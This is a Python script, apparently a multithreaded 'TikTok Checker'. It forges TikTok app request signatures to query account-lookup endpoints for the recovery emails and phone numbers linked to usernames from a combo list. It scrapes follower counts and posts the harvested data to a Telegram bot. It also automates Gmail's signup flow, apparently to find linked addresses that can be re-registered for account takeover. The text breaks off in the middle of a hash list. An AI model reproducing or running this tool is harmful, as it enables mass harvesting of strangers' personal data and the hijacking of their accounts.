import os,time,random,uuid,binascii,json,secrets;from requests import get, post,Session
import SignerPy
import requests
import http.client
import re
from random import choice,randrange
from threading import Thread, Semaphore
import sys
import urllib.parse
from urllib.parse import urlencode
from concurrent.futures import ThreadPoolExecutor

try:from user_agent import generate_user_agent
except:
    os.system('pip install user_agent')

try:
    from MedoSigner import Argus,Gorgon, md5,Ladon
except:
    os.system('pip install MedoSigner')

# --- Color Definitions ---
class Colors:
    RESET = '\033[0m'
    BRIGHT_GREEN = '\033[92m'
    BRIGHT_RED = '\033[91m'
    CYAN = '\033[96m'
    YELLOW = '\033[93m'
    MAGENTA = '\033[95m'
    BLUE = '\033[94m'

# --- Functions from fhs.py (modified to be part of the main script or a class) ---
def sign(params, payload: str = None, sec_device_id: str = "", cookie: str or None = None, aid: int = 1233, license_id: int = 1611921764, sdk_version_str: str = "2.3.1.i18n", sdk_version: int =2, platform: int = 19, unix: int = None):
        x_ss_stub = md5(payload.encode('utf-8')).hexdigest() if payload != None else None
        data=payload
        if not unix: unix = int(time.time())
        return Gorgon(params, unix, payload, cookie).get_value() | { "x-ladon"   : Ladon.encrypt(unix, license_id, aid),"x-argus"   : Argus.get_sign(params, x_ss_stub, unix,platform        = platform,aid             = aid,license_id      = license_id,sec_device_id   = sec_device_id,sdk_version     = sdk_version_str, sdk_version_int = sdk_version)}


class TikTok:
    def __init__(self,user, telegram_id, telegram_token):
        self.data={}
        self.user=user
        self.telegram_id = telegram_id
        self.telegram_token = telegram_token
        self.followers = None

    def send_to_telegram(self, message):
        try:
            telegram_url = f"https://api.telegram.org/bot{self.telegram_token}/sendMessage"
            payload = {
                "chat_id": self.telegram_id,
                "text": message
            }
            requests.post(telegram_url, json=payload)
            print(f"{Colors.BRIGHT_GREEN}Information sent to Telegram successfully.{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.BRIGHT_RED}Failed to send information to Telegram: {e}{Colors.RESET}")

    def check_rest(self):
        cog = secrets.token_hex(6*2+4)
        cookies ={
              "passport_csrf_token": cog,
              "passport_csrf_token_default": cog
            }


        s = Session()
        s.cookies.update(cookies)
        url = "https://api22-normal-c-alisg.tiktokv.com/passport/account_lookup/username/"

        params = {
          'request_tag_from': "h5",
          'fixed_mix_mode': "1",
          'mix_mode': "1",
          'account_param': self.user,
          'scene': "4",
          'device_platform': "android",
          'os': "android",
          'ssmix': "a",
          '_rticket': str(round(random.uniform(1.2, 1.6) * 100000000) * -1) + "4632",
          'cdid': str(uuid.uuid4()),
          'channel': "googleplay",
          'aid': "1233",
          'app_name': "musical_ly",
          'version_code': "370805",
          'version_name': "37.8.5",
          'manifest_version_code': "2023708050",
          'update_version_code': "2023708050",
          'ab_version': "37.8.5",
          'resolution': "720*1448",
          'dpi': "320",
          'device_type': "RMX3269",
          'device_brand': "realme",
          'language': "ar",
          'os_api': "30",
          'os_version': "11",
          'ac': "wifi",
          'is_pad': "0",
          'current_region': "IQ",
          'app_type': "normal",
          'sys_region': "IQ",
          'last_install_time': "1744847306",
          'mcc_mnc': "41840",
          'timezone_name': "Asia%2FBaghdad",
          'carrier_region_v2': "418",
          'residence': "IQ",
          'app_language': "ar",
          'carrier_region': "IQ",
          'timezone_offset': "10800",
          'host_abi': "arm64-v8a",
          'locale': "ar",
          'ac2': "wifi",
          'uoo': "0",
          'op_region': "IQ",
          'build_number': "37.8.5",
          'region': "IQ",
          'ts': str(round(random.uniform(1.2, 1.6) * 100000000) * -1),
          'iid': str(random.randint(1, 10**19)),
          'device_id': str(random.randint(1, 10**19)),
          'openudid': str(binascii.hexlify(os.urandom(8)).decode()),
          'support_webview': "1",
          'cronet_version': "75b93580_2024-11-28",
          'ttnet_version': "4.2.210.6-tiktok",
          'use_store_region_cookie': "1",
          'app_version':"37.8.5"
        }
        m=SignerPy.sign(params=params,cookie=cookies)
        headers = {
          'User-Agent': "com.zhiliaoapp.musically/2023708050 (Linux; U; Android 11; ar; RMX3269; Build/RP1A.201005.001; Cronet/TTNetVersion:75b93580 2024-11-28 QuicVersion:ef6c341e 2024-11-14)",
          'Accept': "application/json, text/plain, */*",
          'content-length': "0",
          'x-tt-referer': "https://inapp.tiktokv.com/ucenter_web/account_lookup_tool",

          'x-tt-passport-csrf-token': cog,

          'content-type': "application/x-www-form-urlencoded",
             'x-argus': m["x-argus"],  'x-gorgon':m["x-gorgon"],'x-khronos': m["x-khronos"],'x-ladon':m["x-ladon"],
        }

        response = s.post(url, params=params, headers=headers)
        try:

            p=response.json()['data']['accounts'][0]['passport_ticket']
            ug=response.json()['data']['accounts'][0]['username']
            params = {
          'request_tag_from': "h5",
          'fixed_mix_mode': "1",
          'mix_mode': "1",
          'account_param': self.user,
          'passport_ticket': p,
          'scene': "4",
          'device_platform': "android",
          'os': "android",
          'ssmix': "a",
          '_rticket': params['_rticket'],
          'cdid': params['cdid'],
          'channel': "googleplay",
          'aid': "1233",
          'app_name': "musical_ly",
          'version_code': "370805",
          'version_name': "37.8.5",
          'manifest_version_code': "2023708050",
          'update_version_code': "2023708050",
          'ab_version': "37.8.5",
          'resolution': "720*1448",
          'dpi': "320",
          'device_type': "RMX3269",
          'device_brand': "realme",
          'language': "ar",
          'os_api': "30",
          'os_version': "11",
          'ac': "wifi",
          'is_pad': "0",
          'current_region': "IQ",
          'app_type': "normal",
          'sys_region': "IQ",
          'last_install_time': "1744847306",
          'mcc_mnc': "41840",
          'timezone_name': "Asia%2FBaghdad",
          'carrier_region_v2': "418",
          'residence': "IQ",
          'app_language': "ar",
          'carrier_region': "IQ",
          'timezone_offset': "10800",
          'host_abi': "arm64-v8a",
          'locale': "ar",
          'ac2': "wifi",
          'uoo': "0",
          'op_region': "IQ",
          'build_number': "37.8.5",
          'region': "IQ",
          'ts': params['ts'],
          'iid': params['iid'],
          'device_id': params['device_id'],
          'openudid': params['openudid'],
          'support_webview': "1",
          'cronet_version': "75b93580_2024-11-28",
          'ttnet_version': "4.2.210.6-tiktok",
          'use_store_region_cookie': "1",
          'app_version':"37.8.5"
        }
            self.data.update({'username':ug})

            m=SignerPy.sign(params=params,cookie=cookies)
            headers = {
          'User-Agent': "com.zhiliaoapp.musically/2023708050 (Linux; U; Android 11; ar; RMX3269; Build/RP1A.201005.001; Cronet/TTNetVersion:75b93580 2024-11-28 QuicVersion:ef6c341e 2024-11-14)",
          'Accept': "application/json, text/plain, */*",
          'content-length': "0",
          'x-tt-referer': "https://inapp.tiktokv.com/ucenter_web/account_lookup_tool",

          'x-tt-passport-csrf-token': headers['x-tt-passport-csrf-token'],

          'content-type': "application/x-www-form-urlencoded",
             'x-argus': m["x-argus"],  'x-gorgon':m["x-gorgon"],'x-khronos': m["x-khronos"],'x-ladon':m["x-ladon"],
        }
            url = "https://api22-normal-c-alisg.tiktokv.com/passport/user/login_by_passport_ticket/"

            response = s.post(url, params=params, headers=headers)
            kj=json.loads(response.headers["x-tt-verify-idv-decision-conf"])
            for uu in kj['extra']:
                oo=uu['info']
                if '@' in oo:
                    k=oo
                    jj=k.split('@')[1]
                    self.data.update({'rest':k})
                    kk=k.split('@')[0]
                    hu=self.user[0]
                    gf=self.user[-1]
                    y=kk[0]
                    iy=kk[-1]
                    if hu==y and gf==iy:
                        headers={'User-Agent':'Mozilla/50 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36'}
                        re=get(f'https://www.tiktok.com/@{self.user}', headers=headers).text
                        followers=str(re).split(':{"followerCount":')[1].split(',')[0]
                        self.followers = followers
                        self.data.update({'username':self.user,'followers':followers,'email':self.user+jj})
                    else:""

                elif '+' in oo:
                    self.data.update({'number':oo})

                else:
                    self.data.update({'Telgrame @as_wqt ':oo})

            print(f"{Colors.BRIGHT_GREEN}TikTok Rest Check Results:{Colors.RESET}")
            for key, value in self.data.items():
                print(f"{Colors.CYAN}{key}: {Colors.YELLOW}{value}{Colors.RESET}")
            
            # تم تعديل هذا الجزء لعرض اسم المستخدم وعدد المتابعين في كل رسالة
            telegram_message = "TikTok Account ALI BASSAM:\n"
            telegram_message += f"Username: {self.user}\n"
            if self.followers:
                telegram_message += f"Followers: {self.followers}\n"
            for key, value in self.data.items():
                if key != 'username' and key != 'followers':
                    telegram_message += f"{key}: {value}\n"
            self.send_to_telegram(telegram_message)


        except Exception as e:
            print(f"{Colors.BRIGHT_RED}Error in TikTok rest check: {e}{Colors.RESET}")
            # تم تعديل هذا الجزء لعرض اسم المستخدم في رسالة الخطأ
            telegram_message = f"An error occurred during TikTok rest check for Username: {self.user}.\n"
            telegram_message += f"Error: {e}"
            self.send_to_telegram(telegram_message)

class TikTokChecker:
    def __init__(self):
        self.good_tiktok = 0
        self.bad_tiktok = 0
        self.good_gmail = 0
        self.bad_gmail = 0
        self.nudes = []
        self.hits = []
        self.list = []
        self.cok = []
        self.ttwids = []
        self.msTokens = []
        self.update_lock = Semaphore(1)

        os.system('clear' if os.name == 'posix' else 'cls')

        print(f"{Colors.BRIGHT_GREEN}╔═══════════════════════════════════════╗")
        print(f"║     {Colors.CYAN}Welcome to ALi Bssam 💻 TikTok Checker{Colors.BRIGHT_GREEN}     ║")
        print(f"╚═══════════════════════════════════════╝{Colors.RESET}\n")

        self.token = input(f'{Colors.YELLOW}- Enter Telegram Bot Token: {Colors.RESET}')
        os.system('clear' if os.name == 'posix' else 'cls')
        self.id = input(f'{Colors.YELLOW}- Enter Telegram Chat ID: {Colors.RESET}')
        while True:
            try:
                file_path = input(f'{Colors.YELLOW}- Enter combo file path: {Colors.RESET}')
                o = open(file_path, 'r').read().splitlines()
                os.system('clear' if os.name == 'posix' else 'cls')
                break
            except FileNotFoundError:
                print(f'{Colors.BRIGHT_RED} File Not Found!{Colors.RESET}')
            except Exception as e:
                print(f'{Colors.BRIGHT_RED} An error occurred: {e}{Colors.RESET}')

        while True:
            try:
                self.thread_count = int(input(f'{Colors.YELLOW}- Enter number of threads (1-100): {Colors.RESET}'))
                if 1 <= self.thread_count <= 100:
                    break
                else:
                    print(f'{Colors.BRIGHT_RED} Please enter a number between 1 and 100.{Colors.RESET}')
            except ValueError:
                print(f'{Colors.BRIGHT_RED} Invalid input. Please enter a number.{Colors.RESET}')

        os.system('clear' if os.name == 'posix' else 'cls')

        self.combo_list = []
        for _ in o:
            if '_' not in _:
                if '@' in _: _ = _.split('@')[0]
                self.combo_list.append(_)

        self.start_checking()

    def start_checking(self):
        with ThreadPoolExecutor(max_workers=self.thread_count) as executor:
            futures = [executor.submit(self.home, username) for username in self.combo_list]
            for future in futures:
                try:
                    future.result()
                except Exception as e:
                    print(f"{Colors.BRIGHT_RED}A thread encountered an error: {e}{Colors.RESET}")
        
        self.update_display()
        print(f"\n{Colors.BRIGHT_GREEN}Checking complete!{Colors.RESET}")

    def gg00(self):
        ua=str(generate_user_agent())
        time0=''
        conn = http.client.HTTPSConnection('accounts.google.com')
        while True:
            try:
                headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'referer': 'https://accounts.google.com/',
        'user-agent': ua,
    }
                conn.request(
        'GET',
        '/lifecycle/flows/signup?biz=false&flowEntry=SignUp&flowName=GlifWebSignIn&followup=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&osid=1&service=mail',
        headers=headers
    )
                response = conn.getresponse().info()
                __Host_GAPS=str(response).split('Set-Cookie: __Host-GAPS=')[1].split(';')[0]
                tl=str(response).split('TL=')[1].split('&')[0]
                break
            except Exception as e:
                time.sleep(1)
                continue
        while True:
            try:
                cookies = {
        '__Host-GAPS': __Host_GAPS,
    }
                headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'referer': 'https://accounts.google.com/',
        'user-agent':  ua,
    }
                response = requests.get(
        'https://accounts.google.com/lifecycle/steps/signup/name?emr=1&flowEntry=SignUp&flowName=GlifWebSignIn&followup=https://mail.google.com/mail/u/0/&osid=1&service=mail&TL='+tl,
        cookies=cookies,
        headers=headers,
    )
                tok=re.findall(r'"(.*?)"',str(response.text).split('<!doctype html')[1].split('/lifecycle/_/AccountLifecyclePlatformSignupUi/')[0])
                po=0
                for i in tok:
                    po+=1
                    if 'SNlM0e' == i:
                        break
                hl=tok[0]
                s1=tok[29]
                at=tok[po]
                break
            except Exception as e:
                time.sleep(1)
                continue
        while True:
            try:
                name=''.join(choice('azertyuiopmlkjhgfdsqwxcvbn') for i in range(randrange(4,13)))
                cookies = {
        '__Host-GAPS': __Host_GAPS,
    }
                headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'origin': 'https://accounts.google.com',
        'referer': 'https://accounts.google.com/',
        'user-agent': ua,
        'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
        'x-goog-ext-391502476-jspb': '["'+s1+'","mail"]',
        'x-same-domain': '1',
    }
                params = {
        'rpcids': 'E815hb',
        'source-path': '/lifecycle/steps/signup/name',
        'hl': hl,
        'TL': tl,
    }
                data = 'f.req=%5B%5B%5B%22E815hb%22%2C%22%5B%5C%22'+name+'%5C%22%2C%5C%22%5C%22%2C0%2C%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2C0%2C1%2C%5C%22%5C%22%2Cnull%2Cnull%2C2%2C2%5D%2Cnull%2C%5B%5D%2C%5B%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2C%5C%22mail%5C%22%5D%2C1%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at='+at+'&'
                response = requests.post(
        'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
        params=params,
        cookies=cookies,
        headers=headers,
        data=data,
    )
                break
            except Exception as e:
                time.sleep(1)
                continue
        while True:
            try:
                yaer=str(randrange(1980,2007))
                month=str(randrange(1,12))
                day=str(randrange(1,28))
                cookies = {
        '__Host-GAPS': __Host_GAPS
    }
                headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'origin': 'https://accounts.google.com',
        'referer': 'https://accounts.google.com/',
        'user-agent': ua,
        'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
        'x-goog-ext-391502476-jspb': '["'+s1+'","mail"]',
        'x-same-domain': '1',
    }
                params = {
        'rpcids': 'eOY7Bb',
        'source-path': '/lifecycle/steps/signup/birthdaygender',
        'hl': hl,
        'TL': tl,
    }

                data = 'f.req=%5B%5B%5B%22eOY7Bb%22%2C%22%5B%5B'+yaer+'%2C'+month+'%2C'+day+'%5D%2C1%2Cnull%2C0%2C%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2C0%2C1%2C%5C%22%5C%22%2Cnull%2Cnull%2C2%2C2%5D%2C%5C%22%3CiUVqRR0CAAZTFvCGcxaNEqaeSioWmer0ADQBEArZ1AbW8EaBzfF11OToJc8rVRf567WhHSsHVMS0KPTiaZwr5pRNxLkK9RFieh5kZPBxzQAAAfCdAAAACKcBB7EAR5bLmW4_pyTl0q5GLHZl4BUTtf5jKTDjvxJk-VC9uNwzsTszdq9QTwfQ0_DHYWRUQ5D-0Q7wlf8WYIT1MtRwAzJlzeQGANesVgivzo24pJLwbK5u09y-72TKV70_6M1xVh6LwwBKoiUNY7W10Ng--cONycFdiuW5-9A6YPDsVqeQjqoACYUa5myX0nOSoLdgirK3Dee6DPRA24QuCxHZdbPJw9ftTchvQHfPacZ2qTX75RGo2yPbKidai5QfBmaQnPDEpAO6vPu0OkTykd1WQUEQQMhO8uLWnPtqnEzJRwVYHYo8JSRIdx3227TV7CmTonE1PHiZPyPb8zB0LHwFrgAhjTUS2edAfguaYgQQS5A1tWvNaGEoeBxrc-B0q_cPQkfrJbCBsCVe6nTN3SZx2QrDfKuc9Z8vOg7OCCkIv98DFRBbJr0WJueIAuIWpCqXyIOpsMyVWHVcgoGiQWLGYzigfAmY47zxxt0CPKslU2gVH5ZzCnEAtfzlG5oG50mS94lg9QEWfIeQkghJ8KXp8SUUnu3mVLKATFn_Ju9AKekgoHGu4gjDfzxzM4MStJojZS98bAVPhagqvp-UCIpAu4Ym7egIqFexR_YNTmxXPbpNHPFYv6FN9k2RDS1WLYxT4N7TzgtWJGc-GF9YZbGzpaeTjbO2_-0GSPX9tmael40o0E-ocd6OxEISENG_ZQTMWxWZzPdYNXxJOD5yAUpbZJR_0WBRk_bA5-PXX6hpA7TvwclDq77YLxWTeVKVmrYDPTPfVc3uAUOrMPV2J565-m9UJ1zqrXALM0fwdfyQPEN4K9hrn9l5U6UJMK18_C349ioqL5kz_yeyj1fKtnDqNlQjkD-xrAfEDqiDAfYhjaFRn9mdymFELdQSWhHCD8ItfapoezIH8OB_wYUKnJiJ76yiweU3h4AV1RxNKDEgIsRVixEyLwSRrl-UsP-MSM8LflbsVQBuiwLQLEbJLFMSlolNVXrlWWgOaWMyhVz6yay4dgiaUustS2xqooWiKyeVMlyDFrwQ092qxBkmsKLqgtVOVInzdW6gNiA79rxALtZXsrlSG1xnSbwwGpxU7qLqUMqb5taN6_RCnzS7gRztKjP_Nxcm2VZe9e-UsIbaFXduTbvYrfELi_21Cwr3mgYvu5nOwK-_lpFPcRAn35xw5K15hZpyAZ0DHJVvWb2MjDNNJiQC9JEexsN4QHBnNRWi4JazEmrhoBPRVcQ970qOY5ayuAFAWbV3P1QUmi5KRHzYVvPBXDyYUK4-Txd5RYKgg1DUxlWAQUXHQJ3pHwLPVwN3QxGM5BWcW2716AhrcPWzn7YvLrYJ1oauQSMKtJw9bNLhnVibIRVJ2epZnPQN3jg3bEqMn5NHj50cUFpF9qe1VlmHd0x7eQsXkGIVUYh5d-mwkOuZ_B-zSW0ifIq5Bf1mXKF9JgyAW8dhETFqXH-a_gjiyAS2BEefo-i3TwaeuAwyh4F6aP_nh168NrICOLZQ92jk3xkk7gYjF_bvxsYwPyz1YRL2n7N1PQAHRdCkqAcjaJ90ieUUNTPwtiFqIhglzrf3GGMHpggdViRoeAzPMlO-ENtQhPqWwWfqnVMkHSLxlU-cfLVPap97ZBQNlNY4_D9zu722n-eOPRrXo53yyx-OXpb3qqFb7y7UR4cYCmXxj0FWTl_RWpnUyxLUwicH2MnhsDaJWBA54fRvNI4nOY8f5VyVBXfaXgLQwJqNrRGcFtLO8Lg1xvHIKDTV_zrz9D168CndnByIESfYOC0OkLt-WBmYbTmNiiHwS7dg8pHngFY389zqAq5ytk4HcyhOtmUgpx2YVIYuVpKh7p78Z8SdBVMyvztqXliq7uwtR8-FJcb0C-CEdDCmdDNB3Hpzkf-1WQGIAqNJjrUz9h6VWJYxmTgc_XPm2s-yk77e5fa9OJ4xjOHeseNtGYhen6gWmNMbh60fl9eemdfE0Fkgp3Hs7MsPkciPLfSFR_xsW8nIVaQEZJSISY-dC0klZTNK2SpWolbZ854i1ErGQCc_3HBh0hIlsPJrqcoPDlmhHs-1Iqtr18aJyfNU_7Iq-IqE9sy0dLVRowqFqFSnDKcv2BjvBF0atL2e6HcXhIQtMZlUKVUl8-GlyO1wqPZrwBY6Y-VWSie93XEcz5oUunkDkTM9P9ZTiLQKQdknPD7Xtis-nkyGya1UtnF-IChRpMnBfaW9V790HZFYD6PKJ15nVIKj42gibtzuK7ssA-3WJwSwA0fKpeT_73UPoa6HE4oE7bhcjzo9ksAOAp99PAuHnJh0J4rIiCeEU7tSbFK2Pw67VuGjI4N9X0j7k0GLzeI688KPB2DGurMp_LvC2IG9CtMQ640NEqeL0E1TxIxx96o0Ei7CyL4Q2QG_FacW0ARHSWSxiR0csbEfl4df9woMkq2kS3MNGmw4kqr0traabbonvPGzXCpuoOSIPwSAbmSPycOrOITw8TgIN5VRiAqm6_SiCsSrukPXsJNk7qRfa4jLW72QUxT7qQILT3G3SPVLYotsWTmpSesKuwYooo4s5Sb4cIXDDDVB4GKYuDmPvSaaa-QLfXeQgzxHLcI_dLHTGn7wWI8zdbghSkdQUIWw3jZvg0uFHjut66bQOSPGeZMP7XWOZtZR0Dgesg8pQ9R-5_yAhQc67C4CryDKkJk5CP-f8Qky3afIppWOH_oPYaLFzW5Da_be-b3jc4qVxlr3_QYH9xQh0JY4Ov1OwFW8BVLCxuILcmtcxoGdnx6j-E73w570E6P_kvuoxx8cYzz5XYamgXz616GpYv6W428iFKuWJea29by1EczNDyuZaWBPc0K0j4XU83JYN0qI-yapNGwUj9xg9D5_xrtQRLruSyEjym8_k_kdUNoN4-y_FzIeygIvPEx3sUioZcpSNDzDbI_dmCFFtHzRxlNVRJ4ztU3vHyO3nAPXt2PrvbJ9e82zeqcYv3z5nbKwr8utji-szOrqg4gKCGm4LVSlgKyWz2C8ZmkTy5VYWBbScWuYTwxb_6GXZW4pcDJIVbtjALx9xDHjYLTHv52ufuhThsXq60u2RQmXaR%5C%22%2C%5Bnull%2Cnull%2C%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5C%22mail%5C%22%5D%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at='+at+'&'
                response = requests.post(
        'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
        params=params,
        cookies=cookies,
        headers=headers,
        data=data,
    )
                break
            except Exception as e:
                time.sleep(1)
                continue
        tm=''
        try:
            return {
                'tokens':{
                    '__Host-GAPS':__Host_GAPS,
                    'TL':tl,
                    'hl':hl,
                    'at':at,
                    's1':s1,
                },
                'info':{
                    'name':name,
                    'birthday':{
                        'day:month:year':day+':'+month+':'+yaer,
                        'day':day,
                        'month':month,
                        'year':yaer,
                    },
                    'by':'@DDDBB4 - https://t.me/tools_watan'
                        },
                'errors':[],
            }
        except Exception as e:
            return {
                'errors':['error get tokens'],
                'tokens':{

                },
                'info':{
                    'by':'@DDDBB4 - https://t.me/tools_luffy',
                },
            }

    def check_linked(self,email):
        while True:
            try:
                hash_list = [
                    "a948087e8602647aa2417b71401b98c8",
"57b1bb14939a7ffee8e8cf7ae1e58b64",
"4efef2ff09e8b18333e2b6c034fe176f",
"61ffb2a4b1dd47b8fd6b01c8bd02eafe",
"4298d8be202d8467a9ae2037ad315fe3",
"4db80548f0721446810b97976d10ff86",
"6442d7441baebb712abb3338fc78cad9",
"6df7d11af8d417aa33e57cfef088410b",
"21ba39babbba73992f24f0f126bf7a55",
"6b8927ba0bccb085c17b3db2e70d53cd",
"b7a87b85e06ca8353910e6cfe5f70bd0",
"49962c217f3b05f2bc46f1ce1382b664",
"015c4a476e9acd03ba1f97aab24bdd2f",
"c6f2a194ac4ab96886e98979b85de2e6",
"c66892b3b7062a2287f338d3c75d28b5",
"7eab67b617139a5cd4d54acb74a981ec",
"e477678baa3953e2fa8e9249ea79ad3a",
"20cf68252042beaec01ab1a5f6d9dab7",
"b41eb8a42aa2b791c17be87221a0772e",
"afa9e2bfc0613ea961861b8b6dece2ce",
"79a5c086b83221fbcc3e395bcb5b6bee",
"12982ad9ea91dcf1a21027dd75eb7715",
"9358abde75ed36b6f3e93bd5ff3ec77e",
"31b2653d315ad2df648c59be4dd3c97b",
"69db14f49c65f829ba228fb674dc5783",
"7a5228775d3c86d3ea96290d1f44452a",
"3ba67d338f3a5424480d543ef82ef309",
"8b5f042c870218867df2c33497778572",
"6432c4926bd4c145bccd4ac5f18013ce",
"90291ed7f741eacab2d7614948fdff52",
"df7a17980c069db2316fc6d8e668cacf",
"af47a38857344ca39cc36e26a5097cf4",
"6f3fcaabd10994c4d6f3c8987a02c11b",
"e6804d1d23b27a1968a7962dcb9bc1ae",
"e160f93facb5c030a029c74beb2e234b",
"6f3fcaabd10994c4d6f3c8987a02c11b",
"b913fc96feca30139330f83a3ac1f729",
"5b4a65219248b9db66c9515262a95c74",
"a3067782e3d4b93ab55a83d457d649d5",
"65c6dd105c5248895834a5741498129d",
"75816ca2320f9b5c276463aa3f9ea4aa",
"b726ff6545886c22891c518b1ab2c018",
"5afb092e4e8b8f317afd0ca790dd4b12",
"12e2daf9d50b9fdc780e638e69194299",
"eefab72e2f1762a8a18b8b0086bd573b",
"7bc7638f77025b0c8f397913adb23944",
"8a8d3dcf2e14c54e51b4591f05c0cc76",
"b5f30ae6ff9496f7a6561bc1a06ca0b4",
"645d465c63003f506c752cd5a97c1e82",
"0b4176ee5aa2413b319d673d6cab1b81",
"b726ff6545886c22891c518b1ab2c018",
"eefab72e2f1762a8a18b8b0086bd573b",
"1d002ac4394cddf8f710613aab3ed625",
"5b4a65219248b9db66c9515262a95c74",
"af47a38857344ca39cc36e26a5097cf4",
"b913fc96feca30139330f83a3ac1f729",
"0b6883c0978c35b4c3ba23f29d5001c2",
"ce5a2dc13ab715c967d333b24236f7d7",
"05946e47542c4bfb7dd1029ac9d02d9f",
"12982ad9ea91dcf1a21027dd75eb7715",
"20cf68252042beaec01ab1a5f6d9dab7",
"31b2653d315ad2df648c59be4dd3c97b",
"3a0cee07f322f7457e28d714b7f2e141",
"57b1bb14939a7ffee8e8cf7ae1e58b64",
"7eab67b617139a5cd4d54acb74a981ec",
"2108c7131efe9a342cfce5d4b612407c",
"6f3fcaabd10994c4d6f3c8987a02c11b",
"49962c217f3b05f2bc46f1ce1382b664",
"733a6bc05f842ec198e5dcc00f4c8f40",
"3a0cee07f322f7457e28d714b7f2e141",
"7bc7638f77025b0c8f397913adb23944",
"c66892b3b7062a2287f338d3c75d28b5",
"6f3fcaabd10994c4d6f3c8987a02c11b",
"98388165c3d4844e657e7836dd2cc78a",
"2c50e29900b739b4cbee1636512b533f",
"6432c4926bd4c145bccd4ac5f18013ce",
"a948087e8602647aa2417b71401b98c8",
"65c6dd105c5248895834a5741498129d",
"57e968a0e406fee2f33a832e21aff59a",
"20c9b65cc050f5e6eb0289dcb98f95c4",
"b7a87b85e06ca8353910e6cfe5f70bd0",
"4db80548f0721446810b97976d10ff86",
"5afb092e4e8b8f317afd0ca790dd4b12",
"8bcd84fa7de6e259a5c658044669e08d",
"1d002ac4394cddf8f710613aab3ed625",
"1f0d6ce685ca5d9f8fad66e9c0ca8b78",
"40dd05308b13c1e962c604610049a5a8",
"87cb87491d35c9addc62dc8da130a316",
"90291ed7f741eacab2d7614948fdff52",
"69db14f49c65f829ba228fb674dc5783",
"733a6bc05f842ec198e5dcc00f4c8f40",
"ae0e18816d946762e3c3392a221f198e",
"2c50e29900b739b4cbee1636512b533f",
"05946e47542c4bfb7dd1029ac9d02d9f",
"40dd05308b13c1e962c604610049a5a8",
"4efef2ff09e8b18333e2b6c034fe176f",
"8bcd84fa7de6e259a5c658044669e08d",
"e477678baa3953e2fa8e9249ea79ad3a",
"12e2daf9d50b9fdc780e638e69194299",
"9358abde75ed36b6f3e93bd5ff3ec77e",
"98388165c3d4844e657e7836dd2cc78a",
"f09b99f844ee2f52ae2bdb2f02213476",
"a6101eaebf59dda2c9245d29a78c794f",
"61ffb2a4b1dd47b8fd6b01c8bd02eafe",
"afa9e2bfc0613ea961861b8b6dece2ce",
"c6f2a194ac4ab96886e98979b85de2e6",
"21ba39babbba73992f24f0f126bf7a55",
"79a5c086b83221fbcc3e395bcb5b6bee",
"0b6883c0978c35b4c3ba23f29d5001c2",
"75816ca2320f9b5c276463aa3f9ea4aa",
"278b94bbb57a92ff23d92c5c52e1d57e",
"5a0d6b2ca82d8824852148c22e146910",
"6b8927ba0bccb085c17b3db2e70d53cd",
"df7246019b382003c7d438e2eec3f812",
"7a5228775d3c86d3ea96290d1f44452a",
"6442d7441baebb712abb3338fc78cad9",
"8100a904b508f86fa19c3b3a2146a979",
"b5f30ae6ff9496f7a6561bc1a06ca0b4",
"b41eb8a42aa2b791c17be87221a0772e",
"f09b99f844ee2f52ae2bdb2f02213476",
"a7a6042fd8bb7aa59496346d9646e46f",
"3ba67d338f3a5424480d543ef82ef309",
"2747f4c3d1f3b922f7b86dcd546af8d7",
"d08e27df2c75af9276fc4b0f60d72d19",
"87cb87491d35c9addc62dc8da130a316",
"57e968a0e406fee2f33a832e21aff59a",
"6bf28abdc354288b73bf99008f6a361f",
"015c4a476e9acd03ba1f97aab24bdd2f",
"8a8d3dcf2e14c54e51b4591f05c0cc76",
"8d7571beb5a4285e6bccfa4cc6a4d502",
"2108c7131efe9a342cfce5d4b612407c",
"ce5a2dc13ab715c967d333b24236f7d7",
"ae0e18816d946762e3c3392a221f198e",
"f4fd0301c875e5a5da06c14fd136934c",
"648c1df7cef3ed3bd814c932939ce846",
"8b5f042c870218867df2c33497778572",
"bb4cef9ef619cb46f0a45c308c0d1e25",
"a3067782e3d4b93ab55a83d457d649d5",
"a6101eaebf59dda2c9245d29a78c794f",
"525d663adcec79b1601cdfa2125627dc",
"0f2d6256d2252a5cecd575b76009e8c2",
"e6804d1d23b27a1968a7962dcb9bc1ae",
